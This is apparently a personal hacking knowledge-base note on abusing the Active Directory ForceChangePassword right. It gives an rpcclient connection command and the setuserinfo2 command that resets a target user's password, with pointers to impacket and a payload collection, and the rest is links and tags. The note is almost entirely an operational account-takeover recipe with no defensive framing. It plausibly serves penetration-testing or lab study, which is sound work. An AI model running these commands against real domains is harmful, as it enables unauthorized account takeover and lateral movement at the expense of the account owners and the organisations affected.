# active directory  ForceChangePassword change user password
can exploit with impacket
payloadsallthethings "Active Directory Attack.md"
```bash
rpcclient $IP -U username -W domain.local
```
within rpcclient shell
```
setuserinfo2 targetuser 23 targetnewpwd
```

` zet/20221003151139/README.md `

# Related

- [20221014185654](/zet/20221014185654/README.md) kb file named kb/hacking/windows/windows-active-directory-and-privilege-information.md
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub
- [20221003151144](/zet/20221003151144/README.md) active directory 
- ~/kb/hacking/windows/windows-active-directory-and-privilege-information.md

Tags:

    #hacking #windows
